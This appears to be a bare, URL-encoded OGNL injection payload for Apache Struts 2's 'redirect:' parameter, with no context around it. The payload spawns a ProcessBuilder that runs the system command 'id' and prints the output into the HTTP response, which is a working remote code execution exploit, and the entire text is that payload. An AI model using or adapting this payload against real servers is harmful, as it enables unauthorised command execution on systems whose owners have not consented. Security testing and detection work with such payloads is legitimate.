redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23test%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23test.getWriter().println(%23e),%23test.getWriter().flush(),%23test.getWriter().close()}
